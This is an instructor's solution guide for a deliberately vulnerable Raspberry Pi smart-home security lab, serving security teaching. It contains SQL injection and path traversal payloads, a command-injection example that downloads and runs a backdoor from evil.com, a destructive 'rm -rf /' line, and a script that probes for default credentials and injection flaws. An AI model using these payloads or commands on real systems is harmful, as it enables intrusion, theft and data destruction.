# Lab 1: Vulnerable Smart Home Demo
## Instructor Guide & Solutions

### Pre-Lab Setup

#### Required Infrastructure
- Network isolated lab environment (VLAN or air-gapped)
- One Raspberry Pi per student/group
- DHCP server for IP assignment
- Optional: Monitoring system to observe student activities

#### Preparation Checklist
- [ ] Flash Raspberry Pi SD cards with Raspbian
- [ ] Configure network isolation
- [ ] Test application deployment
- [ ] Prepare reset scripts for quick recovery
- [ ] Set up demonstration system

---

## Complete Vulnerability List & Solutions

### 1. **Hardcoded Credentials** (Critical)
- **Location:** `vulnerable_iot_app.py` lines 14-15
- **Finding:** View source, comments, or try common defaults
- **Exploit:** Login with admin/123456
- **Impact:** Full administrative access
- **Fix:** Use environment variables, secure credential storage

### 2. **SQL Injection** (Critical)
- **Location:** `/login` endpoint
- **Exploit Payloads:**
  ```sql
  Username: admin' OR '1'='1
  Username: admin'--
  Username: ' OR 1=1--
  ```
- **Advanced:** Extract database
  ```sql
  ' UNION SELECT 1,2,3--
  ' UNION SELECT username,password,3 FROM users--
  ```
- **Fix:** Parameterized queries

### 3. **Command Injection** (Critical)
- **Location:** `/api/command` endpoint
- **Exploit Examples:**
  ```bash
  ls -la
  cat /etc/passwd
  wget evil.com/backdoor.sh && bash backdoor.sh
  rm -rf / --no-preserve-root  # DO NOT RUN
  ```
- **Fix:** Input validation, whitelist commands, use subprocess without shell=True

### 4. **Sensitive Data Exposure** (High)
- **Locations:**
  - HTML comments with credentials
  - JavaScript console.log statements
  - `/api/settings` endpoint
  - localStorage/cookies
  - Verbose error messages
- **Finding Method:** Developer tools, view source
- **Fix:** Remove all sensitive data from client-side

### 5. **Insecure Direct Object Reference** (High)
- **Location:** `/firmware?file=` endpoint
- **Exploit:** Directory traversal
  ```
  /firmware?file=../../../etc/passwd
  /firmware?file=../vulnerable_iot_app.py
  ```
- **Fix:** Validate file paths, use whitelist

### 6. **Missing Authentication** (High)
- **Affected Endpoints:**
  - `/api/temperature`
  - `/api/settings`
  - `/logs`
- **Impact:** Unauthorized access to sensitive data
- **Fix:** Implement authentication middleware

### 7. **Weak Session Management** (Medium)
- **Issue:** MD5 hash of username as token
- **Exploit:** Predictable tokens
  ```python
  import hashlib
  token = hashlib.md5("admin".encode()).hexdigest()
  # Token: 21232f297a57a5a743894a0e4a801fc3
  ```
- **Fix:** Use secure random tokens, JWT

### 8. **CORS Misconfiguration** (Medium)
- **Issue:** Access-Control-Allow-Origin: *
- **Exploit:** Cross-site data theft
- **Fix:** Whitelist specific origins

### 9. **Debug Mode Enabled** (Medium)
- **Impact:** Stack traces, source code disclosure
- **Fix:** Disable debug in production

### 10. **Information Disclosure** (Medium)
- **Multiple locations:**
  - Version numbers
  - System information in API responses
  - Process lists
  - Memory usage
- **Fix:** Minimize information in responses

### 11. **Insecure Cookies** (Low)
- **Issues:**
  - No HttpOnly flag
  - No Secure flag
  - No SameSite attribute
- **Fix:** Set appropriate cookie flags

### 12. **Weak Cryptography** (Low)
- **Issue:** MD5 for password hashing
- **Fix:** Use bcrypt, scrypt, or Argon2

### 13. **Client-Side Validation Only** (Low)
- **Location:** Login form
- **Bypass:** Direct API calls
- **Fix:** Server-side validation

### 14. **Autocomplete on Password Fields** (Low)
- **Issue:** Browser saves passwords
- **Fix:** autocomplete="off" for sensitive fields

### 15. **Exposed Network Services** (Medium)
- **Issue:** Binding to 0.0.0.0
- **Fix:** Bind to specific interfaces

### 16. **Backup Files** (Medium)
- **Finding:** backup.sh with credentials
- **Fix:** Secure backup procedures

---

## Teaching Points

### Discussion Topics

1. **Defense in Depth**
   - No single security measure is sufficient
   - Layer multiple controls
   - Assume breach mentality

2. **OWASP IoT Top 10**
   - Walk through each category
   - Real-world examples
   - Industry impact stories

3. **Security vs Usability**
   - Trade-offs in IoT design
   - User experience considerations
   - Business pressures

4. **Supply Chain Security**
   - Default credentials problem
   - Firmware updates
   - Third-party components

### Live Demonstration Script

1. **Start with reconnaissance** (10 min)
   - Show network scanning
   - Demonstrate information gathering
   - Highlight how much is exposed

2. **Authentication bypass** (10 min)
   - Try default credentials
   - Demonstrate SQL injection
   - Show token prediction

3. **Command injection** (10 min)
   - Start with harmless commands
   - Escalate to system information
   - Demonstrate potential for backdoor

4. **Data extraction** (10 min)
   - Pull configuration files
   - Extract database
   - Show impact of exposed API keys

---

## Common Student Issues & Solutions

### Technical Problems

**Issue:** Can't connect to Raspberry Pi
- Check network configuration
- Verify firewall rules
- Ensure same subnet

**Issue:** Application won't start
- Check Python version (needs 3.7+)
- Verify Flask installation
- Check port 5000 availability

**Issue:** SQL injection not working
- Ensure quotes are correct type
- Check SQL syntax
- Try different payloads

### Conceptual Misunderstandings

**"Why would anyone deploy this?"**
- Discuss time/budget pressures
- Lack of security awareness
- Legacy systems
- Supply chain issues

**"This seems too easy"**
- Real IoT devices often worse
- Shodan demonstrations
- News articles about breaches

---

## Assessment Guidelines

### Grading Considerations

**Exceptional (95-100%):**
- Finds all major vulnerabilities
- Discovers unlisted vulnerabilities
- Provides working exploit code
- Excellent report quality
- Strong remediation plan

**Proficient (85-94%):**
- Finds 12+ vulnerabilities
- Successfully exploits 3+ critical issues
- Good documentation
- Solid understanding demonstrated

**Satisfactory (75-84%):**
- Finds 8-11 vulnerabilities
- Basic exploitation success
- Adequate documentation
- Shows understanding of concepts

**Needs Improvement (<75%):**
- Finds fewer than 8 vulnerabilities
- Limited exploitation success
- Poor documentation
- Unclear understanding

### Sample Exploits for Testing

```python
# Automated vulnerability scanner
import requests
import json

target = "http://192.168.1.100:5000"

# Test for default credentials
def test_default_creds():
    creds = [
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "admin")
    ]
    for user, pwd in creds:
        r = requests.post(f"{target}/login", 
                         data={"username": user, "password": pwd})
        if "success" in r.text:
            print(f"[+] Default creds found: {user}:{pwd}")
            return True
    return False

# Test for SQL injection
def test_sqli():
    payload = {"username": "admin' OR '1'='1", "password": "anything"}
    r = requests.post(f"{target}/login", data=payload)
    if "success" in r.text:
        print("[+] SQL Injection vulnerable")
        return True
    return False

# Test for command injection
def test_command_injection():
    payload = {"command": "id"}
    r = requests.post(f"{target}/api/command", json=payload)
    if "uid=" in r.text:
        print("[+] Command injection confirmed")
        return True
    return False

# Run tests
test_default_creds()
test_sqli()
test_command_injection()
```

---

## Post-Lab Discussion Questions

1. What was the most critical vulnerability and why?
2. How would you prioritize fixes with limited resources?
3. What would be the business impact of these vulnerabilities?
4. How could these vulnerabilities be prevented during development?
5. What additional security measures would you implement?

---

## Extensions & Advanced Challenges

### For Advanced Students
1. Write an automated exploitation tool
2. Create a Metasploit module
3. Implement a backdoor that survives reboot
4. Perform privilege escalation to root
5. Set up a reverse shell

### Follow-up Lab Ideas
1. Secure version - students fix vulnerabilities
2. Penetration testing competition
3. Incident response scenario
4. Forensics investigation

---

## Safety & Ethics Reminders

⚠️ **Critical Points to Emphasize:**
- Legal implications of unauthorized access
- Responsible disclosure processes
- Real-world consequences of IoT breaches
- Professional ethics in security
- Never test on production systems

**Required Ethics Discussion:**
- Review relevant laws (CFAA, etc.)
- Discuss bug bounty programs
- Cover responsible disclosure
- Emphasize defensive mindset

---

## Lab Reset Procedures

```bash
#!/bin/bash
# Quick reset script between student groups

# Stop application
pkill -f vulnerable_iot_app.py

# Clear databases and logs
rm -f iot_temp.db
rm -f /tmp/backup_*
rm -rf logs/*

# Reset configurations
cp config.ini.backup config.ini

# Clear browser data reminder
echo "Remember to clear browser cache/cookies"

# Restart application
python3 vulnerable_iot_app.py &

echo "Lab reset complete"
```

---

## Additional Resources

### References for Students
- OWASP IoT Top 10
- NIST IoT Cybersecurity Framework
- IoT Security Foundation Guidelines

### Tools to Introduce
- Burp Suite Community Edition
- OWASP ZAP
- Wireshark
- nmap
- sqlmap (with warnings)

### Real-World Case Studies
- Mirai Botnet
- Casino Fish Tank Hack
- Jeep Cherokee Hack
- Ring Camera Vulnerabilities
- Medical Device Security Issues
